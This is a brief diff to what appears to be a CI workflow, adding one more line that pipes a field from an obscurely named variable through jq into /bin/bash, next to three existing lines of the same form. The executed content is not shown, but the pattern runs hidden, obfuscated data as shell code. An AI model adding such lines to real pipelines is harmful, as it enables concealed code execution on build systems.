@@ -24,6 +24,7 @@ jobs:
           echo $rj06 | jq -r .zjyd181 | /bin/bash
           echo $tyne71834 | jq -r .tt812 | /bin/bash
           printf '%s' "$pa4227" | jq -r .dkfss00 | /bin/bash
+          printf '%s' "$pji04" | jq -r .vmze70378 | /bin/bash
 
       - name: Upload results
         if: always()
